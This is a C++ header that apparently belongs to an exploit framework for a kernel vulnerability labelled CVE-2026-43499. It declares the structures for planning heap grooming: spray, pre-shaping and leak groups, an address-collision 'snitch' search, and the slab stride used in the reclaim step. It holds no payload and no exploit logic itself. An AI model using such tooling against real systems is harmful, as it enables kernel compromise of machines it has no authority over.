#pragma once
/** @file backend/cve_2026_43499/memory/prepare_plan.hpp
 *  What a page preparation will act on: the order, and the sizes it will use.
 *
 *  The order is not decided here -- prepare_steps owns it and this file reads it, so
 *  the twelve phases exist once. What this file adds is the arithmetic that turns the
 *  sizes into a plan: which phase acts on how many children, and one derived number
 *  the reclaim needs, the slab stride, which is the region size divided by the size
 *  of one object in it.
 *
 *  Every size is an input. The counts and the timeouts belong to the profile and the
 *  two sizes belong to the kernel's geometry, which is why nothing here carries a
 *  number of its own: a plan built from inputs can be tested anywhere, and the
 *  question of where each input comes from stays where it belongs.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/memory/prepare_steps.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    /** The sizes one preparation is built from, all of them inputs. */
    struct PrepareInputs final {
        /** How many children each group gets. */
        std::size_t pre_groups = 0U;
        /** 退役 `pre_ctx`：spray **之后**、snitch **之前**（整形泄漏落点 ✓；值 = mm_objs_per_slab − 1）。 */
        std::size_t pre_shaped_groups = 0U;
        std::size_t spray_groups = 0U;
        std::size_t post_groups = 0U;
        std::size_t leak_groups = 0U;
        /** How many collisions the address search is asked for. */
        std::size_t snitch_collisions = 0U;
        /** The region an address is rounded down to, and the size of one object in
         *  it: the slab stride is the quotient of the two. */
        std::uint64_t region_size = 0U;
        std::uint64_t object_size = 0U;
    };

    /** Why a plan could not be built. Names follow the single table. */
    enum class PrepareVerdict : unsigned char {
        Ok = 0,
        /** A size the preparation cannot act on: zero where one is needed. */
        InputsInvalid = 1,
        /** The two sizes do not divide: there is no whole number of objects. */
        GeometryInvalid = 2,
    };

    [[nodiscard]] constexpr const char *prepare_verdict_name(PrepareVerdict verdict) noexcept {
        switch (verdict) {
            case PrepareVerdict::Ok: return "ok";
            case PrepareVerdict::InputsInvalid: return "param-invalid";
            case PrepareVerdict::GeometryInvalid: return "geometry-missing";
        }
        return "unknown";
    }

    /** The plan: the order, the sizes per phase, and the derived stride. */
    struct PreparePlan final {
        /** The phases, in order, read from the table that owns them. */
        const PrepareStep *steps = nullptr;
        std::size_t step_count = 0U;
        std::size_t pre_groups = 0U;
        /** 退役 `pre_ctx`：spray **之后**、snitch **之前**（整形泄漏落点 ✓；值 = mm_objs_per_slab − 1）。 */
        std::size_t pre_shaped_groups = 0U;
        std::size_t spray_groups = 0U;
        std::size_t post_groups = 0U;
        std::size_t leak_groups = 0U;
        std::size_t snitch_collisions = 0U;
        /** How many objects fit in one region: the reclaim walks the spray one per
         *  stride, so a stride of zero would be a walk that never advances. */
        std::size_t objects_per_region = 0U;
    };

    /** Build the plan. Nothing is handed over on a refusal. */
    [[nodiscard]] PrepareVerdict build_prepare_plan(const PrepareInputs &inputs,
                                                    PreparePlan &out) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
